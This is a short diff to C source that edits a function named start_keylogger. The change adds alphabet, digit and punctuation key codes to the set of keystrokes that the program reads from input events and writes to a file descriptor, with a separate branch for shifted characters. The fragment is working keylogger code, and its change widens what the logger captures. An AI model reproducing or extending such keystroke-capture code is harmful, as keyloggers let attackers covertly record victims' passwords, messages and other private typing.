@@ -764,9 +764,9 @@ void start_keylogger()
                 }
                 else
                 {
-                    if ((ie.code >= 16 && ie.code <= 25) || (ie.code >= 30 && ie.code <= 38) || (ie.code >= 44 && ie.code <= 50))
+                    if ((ie.code >= 16 && ie.code <= 25) || (ie.code >= 30 && ie.code <= 38) || (ie.code >= 44 && ie.code <= 50)) // Alphabet keys
                         write(write_fd, keys_normal[ie.code], strlen(keys_normal[ie.code]));
-                    else if (ie.code >= 2 && ie.code <= 13) // Number keys
+                    else if ((ie.code >= 2 && ie.code <= 13) || ie.code == 39 || ie.code == 40 || ie.code == 41 || ie.code == 51 || ie.code == 52 || ie.code == 53 || ie.code == 12 || ie.code == 43) // Number keys and additional keys
                     {
                         if (shift_state == 1)
                             write(write_fd, keys_caps[ie.code], strlen(keys_caps[ie.code]));
